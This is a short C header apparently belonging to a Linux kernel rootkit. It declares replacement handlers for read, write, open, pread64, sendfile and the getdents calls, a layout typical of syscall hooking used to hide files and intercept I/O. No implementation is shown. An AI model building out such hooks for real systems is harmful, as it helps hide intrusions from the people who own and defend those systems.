#ifndef _ROOTKIT_ROOTKIT_MAIN_H_
#define _ROOTKIT_ROOTKIT_MAIN_H_

#include <asm/ptrace.h>
#include <linux/linkage.h>

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

asmlinkage long new_read(struct pt_regs *p_regs);
asmlinkage long new_write(struct pt_regs *p_regs);
asmlinkage long new_open(struct pt_regs *p_regs);
asmlinkage long new_pread64(struct pt_regs *p_regs);
asmlinkage long new_sendfile(struct pt_regs *p_regs);
asmlinkage long new_getdents(struct pt_regs *p_regs);
asmlinkage long new_getdents64(struct pt_regs *p_regs);

#endif
